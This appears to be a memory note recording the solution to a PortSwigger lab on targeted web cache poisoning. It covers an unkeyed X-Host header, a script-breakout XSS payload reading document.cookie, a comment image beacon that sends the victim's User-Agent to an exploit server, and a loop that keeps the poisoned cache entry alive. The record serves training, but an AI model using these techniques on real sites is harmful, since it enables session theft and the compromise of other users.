---
metadata:
  node_type: memory
name: "Lab solves: web cache poisoning arm A"
description: "Arm A solve: X-Host reflected into tracking.js src, Vary: User-Agent cache key, victim UA harvested via comment img beacon to exploit server log"
last_updated: 2026-10-10T16:34:38+08:00
created: 2026-10-10T16:34:38+08:00
---

## 2026-10-10 Lab: Targeted web cache poisoning using an unknown header (PortSwigger)

- Target: blog home/post pages. `/` renders (all pages) `resources/js/tracking.js` via a
  protocol-relative src whose host comes from the request header **X-Host** (unkeyed input).
- Cache: `Cache-Control: max-age=30`, `Vary: User-Agent` -> cache key = path (+query) + UA.
  X-Host is NOT keyed, so a value supplied once is replayed to every later hit of that key.
- Finding the header: candidate-name sweep must bust the cache per probe (unique `?cb=<name>`
  path); a plain sweep returns `X-Cache: hit` crowd and shows zero reflection (false negative).
- Reflection context (unescaped): `<script type="text/javascript" src="//X-HOST/resources/js/tracking.js"></script>`.
  Payload `zq"></script><script>alert(document.cookie)</script>` breaks out of the src attribute.
- Targeting: victim UA is not exposed by the app. Posted a comment containing
  `<img src="https://<exploit-server>/exploit">`; the victim's page load triggered the img and the
  exploit-server access log (GET /log) printed:
  `Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36`.
- Exploit: prime `GET /post?postId=1` with that UA + the X-Host payload, verify with a second
  request from the same UA and no X-Host (`X-Cache: hit`, payload present), then hold the entry with
  poison_loop (interval 5s) across TTL expiries until the victim's cycle lands in the window.
- Notes for reuse: exploit server serves the stored file only at the exact `responseFile` path
  (arbitrary paths 404), so an X-Host hostname payload needs responseFile=/resources/js/tracking.js;
  attribute breakout avoids that dependency. Solved evidence: fresh `/` render shows
  `academyLabBanner is-solved` + "Congratulations, you solved the lab!".
- Timing: first victim visit ~35 s after the comment POST; solve confirmed ~50 s after priming.

